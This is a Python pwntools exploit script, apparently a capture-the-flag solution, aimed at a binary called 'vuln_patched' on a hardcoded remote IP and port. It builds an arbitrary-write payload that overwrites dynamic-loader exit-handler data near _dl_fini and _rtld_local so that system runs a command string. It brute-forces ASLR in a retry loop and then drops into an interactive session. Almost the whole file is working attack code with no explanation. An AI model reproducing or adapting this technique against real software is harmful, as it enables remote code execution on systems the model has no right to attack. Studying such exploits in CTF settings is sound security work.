#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./vuln_patched
import random
from pwn import *

HOST, PORT = "localhost 55557".split() if args.LOCALHOST else "65.108.176.61 55557".split()
# HOST, PORT = "192.168.152.132 55557".split()
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./vuln_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *_dl_fini+325
# b *__run_exit_handlers
continue
'''.format(**locals())

trials = -1

def prepare_payload(addr: int, data: bytearray, length: int) -> list:
    payload = []

    for i in range(length):
        temp_addr = (addr+i).to_bytes(3, "big").hex()
        temp_data = data[i].to_bytes(1, "little").hex()
        temp = f"{temp_addr} {temp_data}"
        payload.append(temp.encode())

    return payload

# write system here
dl_fini_offset = 0x307f88
# write /bin/sh there
rtld_local = 0x307978
size = 10
# /readf*
payload = prepare_payload(rtld_local, bytearray(b"/readf*"), 7)

# system offset + ASLR guess
payload += prepare_payload(0x307f80, bytearray(p64(0x169de0)), 3)

while True:
    trials += 1
    log.info(f"trial: {trials}")

    try:
        io = start()
    except:
        log.warning("Connection failed, sleeping before another trial...")
        sleep(20)
        continue
    if args.REMOTE:
        io.recvline()

    if args.GDB:
        pause()

    io.sendline(b"100000")

    io.sendline(size.to_bytes(1, "big").hex().encode())

    for line in payload:
        io.sendline(line)

    if args.GDB:
        pause()

    res = io.recvall(timeout=5)
    if res:
        log.success(f"Got response: {res}")
        log.info(f"trials: {trials}")
        io.interactive()
        break

    if args.GDB:
        break
